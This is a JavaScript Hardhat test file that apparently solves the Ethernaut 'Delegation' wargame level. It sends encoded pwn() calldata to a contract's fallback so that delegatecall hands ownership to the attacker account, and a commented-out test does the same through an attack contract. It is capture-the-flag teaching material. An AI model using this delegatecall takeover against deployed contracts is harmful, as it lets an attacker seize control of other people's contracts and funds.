const { assert } = require("chai")
const { deployments, ethers } = require("hardhat")

describe("06-Delegation", async function () {
    let deployer, attacker, delegation
    beforeEach(async function () {
        accounts = await ethers.getSigners()
        deployer = accounts[0]
        attacker = accounts[1]
        await deployments.fixture(["06"])
        delegate = await ethers.getContract("Delegate")
        delegation = await ethers.getContract("Delegation")
        delegationAttack = await ethers.getContract("DelegationAttack", attacker.address)
    })
    it("should transfer ownership to the attacker", async function () {
        // check deployer is owner
        const initialOwner = await delegation.owner()
        assert.equal(initialOwner, deployer.address)

        // get msg data (should be 74 digits)
        const calldata = delegate.interface.encodeFunctionData("pwn", [])

        // trigger fallback function
        await attacker.sendTransaction({
            to: delegation.address,
            data: calldata,
        })

        // check attacker is owner
        const newOwner = await delegation.owner()
        assert.equal(newOwner, attacker.address)
    })
    /*
    it("should transfer ownership to attack contract", async function () {
        // check deployer is owner
        const initialOwner = await delegation.owner()
        assert.equal(initialOwner, deployer.address)
        // attack
        await delegationAttack.attack()
        // check attack contract is owner
        const newOwner = await delegation.owner()
        assert.equal(newOwner, delegationAttack.address)
    })*/
})
